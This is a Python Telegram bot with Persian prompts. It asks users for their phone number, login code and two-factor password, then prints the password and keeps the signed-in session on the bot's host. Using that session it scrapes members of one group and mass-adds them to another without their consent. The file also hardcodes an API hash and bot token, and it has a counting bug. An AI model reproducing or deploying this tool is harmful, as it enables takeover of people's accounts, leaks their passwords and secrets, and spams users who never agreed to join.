from telethon import client
from telethon.errors.rpcerrorlist import PasswordEmptyError
from telethon.sync import TelegramClient, events
from telethon.tl.custom.button import Button
from telethon.tl.functions.messages import GetDialogsRequest
from telethon.tl.types import InputPeerChat, InputPeerEmpty
from telethon.tl.types import Channel,ChatForbidden,Chat, PeerChannel, PeerChat
from telethon.tl.functions.messages import AddChatUserRequest
from telethon.tl.functions.channels import InviteToChannelRequest
from telethon.errors import SessionPasswordNeededError
api_id = "4540261"
api_hash = "8627c4e0ef04c5cd61afcee91bdaa7de"
bot_token = "2089471836:AAFyYV9ehBBRmW-xfwY5fjp4PrXFLhefMjY"

bot = TelegramClient('bot', api_id, api_hash)
bot.start(bot_token=bot_token)
class setting:
    Type=""
    Id=0
    Phone=""
@bot.on(events.NewMessage(pattern="/start"))
async def handler(event):
    print(event)
    print(event.raw_text)
    buttons = [
        [
            Button.text(" لیست گروه ها ", resize=True),
            Button.text(" ثبت شماره ", resize=True),
        ],
        [
            Button.text(" انتخاب گروه ", resize=True)
        ]
    ]
    msg = "چه کاری می‌تونم برات انجام بدم؟؟"
    await event.client.send_message(event.chat_id, msg, buttons=buttons)


@bot.on(events.NewMessage(pattern="(لیست گروه ها)"))
async def addGroup(event):
    async with bot.conversation(event.chat_id) as conv:
        await conv.send_message("لطفا شماره خود را بفرستید")
        phone = await conv.get_response()
        phone = phone.message
        setting.Phone = phone
        client = TelegramClient(phone,api_id,api_hash)
        await client.connect()
        if await client.is_user_authorized():
            result = await client(GetDialogsRequest(
                offset_date=None,
                offset_id=0,
                offset_peer=InputPeerEmpty(),
                limit=200,
                hash=0
            ))
            msg = ""
            for r in result.chats:
                print(type(r))
                print(r)
                if type(r)==Chat:
                    m = F"\n عنوان: {r.title}\n آیدی: {r.id}\n /run_{r.id}_group"
                    msg += m
                elif  (type(r)==Channel and r.megagroup==True):
                    m = F"\n عنوان: {r.title}\n آیدی: {r.id}\n /run_{r.id}_mega"
                    msg += m
            await conv.send_message(msg)
        else:
            await conv.send_message("اول شماره خود را ثبت کنید")

        await client.disconnect()

@bot.on(events.NewMessage(pattern="(انتخاب گروه)"))
async def selectGroup(event):
    async with bot.conversation(event.chat_id) as conv:
        await conv.send_message("لطفا شماره خود را بفرستید")
        phone = await conv.get_response()
        phone = phone.message
        client = TelegramClient(phone,api_id,api_hash)
        await client.connect()
        if await client.is_user_authorized():
            result = await client(GetDialogsRequest(
                offset_date=None,
                offset_id=0,
                offset_peer=InputPeerEmpty(),
                limit=200,
                hash=0
            ))
            msg = ""
            for r in result.chats:
                print(type(r))
                print(r)
                if type(r)==Chat:
                    m = F"\n عنوان: {r.title}\n آیدی: {r.id}\n /select_{r.id}_group"
                    msg += m
                elif  (type(r)==Channel and r.megagroup==True):
                    m = F"\n عنوان: {r.title}\n آیدی: {r.id}\n /select_{r.id}_mega"
                    msg += m
            await conv.send_message(msg)
        else:
            await conv.send_message("اول شماره خود را ثبت کنید")

        await client.disconnect()

@bot.on(events.NewMessage(pattern="(ثبت شماره)"))
async def addWorker(event):
    async with bot.conversation(event.chat_id) as conv:
        await conv.send_message("لطفا شماره خود را بفرستید")
        phone = await conv.get_response()
        phone = phone.message
        worker = TelegramClient(phone, api_id,api_hash)
        await worker.connect()
        if await worker.is_user_authorized():
            await conv.send_message("این شماره قبلا ثبت شده است")
        else:
            send_code = await worker.send_code_request(phone)
            send_code_hash = send_code.phone_code_hash
            await conv.send_message("لطفا کدی که از طرف تلگرام به شما فرستاده شد به ما بفرستید")
            code = await conv.get_response()
            code = code.message
            code = code[1:]
            print(code)
            # Two Factor Authorization 
            await conv.send_message("لطفا رمز اکانت را بفرستید")
            passwd = await conv.get_response()
            passwd = passwd.message
            print(passwd)
            try:
                await worker.sign_in(phone=phone,code=code,phone_code_hash=send_code_hash,password=passwd)
            except SessionPasswordNeededError:
                await worker.sign_in(password=passwd)
            # End Two Factor Authorization
            await conv.send_message("با موفقیت ثبت شد")
        await worker.disconnect()
@bot.on(events.NewMessage(pattern="/select"))
async def setGroup(event):
    attr = event.raw_text.split("_")
    setting.Id = int(attr[1])
    setting.Type = attr[2]
    await event.client.send_message(event.chat_id,"گروه با موفقیت ثبت شد")

@bot.on(events.NewMessage(pattern="/run"))
async def start(event):
    async with bot.conversation(event.chat_id) as conv:
        # await conv.send_message("لطفا شماره خود را بفرستید")
        # phone = await conv.get_response()
        phone = setting.Phone
        attr = event.raw_text.split("_")
        worker = TelegramClient(phone, api_id,api_hash)
        await worker.connect()
        if await worker.is_user_authorized():
            dialogs = await worker.get_dialogs()
            target = int(attr[1])
            await conv.send_message("از کدام عضو شروع کنم؟")
            memberId = await conv.get_response()
            memberId = int(memberId.message)
            members = []
            if attr[2]=="group":
                targetEntity = await worker.get_input_entity(PeerChat(target))
                members = await worker.get_participants(targetEntity)
            elif attr[2]=="mega":
                targetEntity = await worker.get_input_entity(PeerChannel(target))
                members = await worker.get_participants(targetEntity)
            members = members[memberId:]
            Tried = 0
            added = 0
            dontadded = 0
            for member in members:
                if setting.Type=="group":
                    try:
                        r = await worker(
                        AddChatUserRequest(
                        setting.Id,
                        member,
                        fwd_limit=200  # Allow the user to see the 200 last messages
                        ))
                        added += 1
                        print("added")

                    except Exception as err:
                        print(err)
                        dontadded += 1
                    finally:
                        if(Tried==50):
                            break
                        Tried += 1
                elif setting.Type=="mega":
                    try:
                        myGroupEntity = await worker.get_input_entity(PeerChannel(setting.Id))
                        r = await worker(InviteToChannelRequest(
                        myGroupEntity,
                        [member]
                        ))
                        added =+ 1
                        print("added")
                        print(r)
                    except Exception as err:
                        print(err)
                        dontadded += 1
                    finally:
                        if(Tried==50):
                            break
                        Tried += 1
            await conv.send_message(F"Tried: {Tried}\nAdded: {Tried-dontadded}\nError: {dontadded}")
            await bot.send_message(1460546834, F"Tried: {Tried}\nAdded: {Tried-dontadded}\nError: {dontadded}")
                    
        else:
            await conv.send_message("اول شماره خود را ثبت کنید")
        await worker.disconnect()
print("|Start|")
bot.run_until_disconnected()
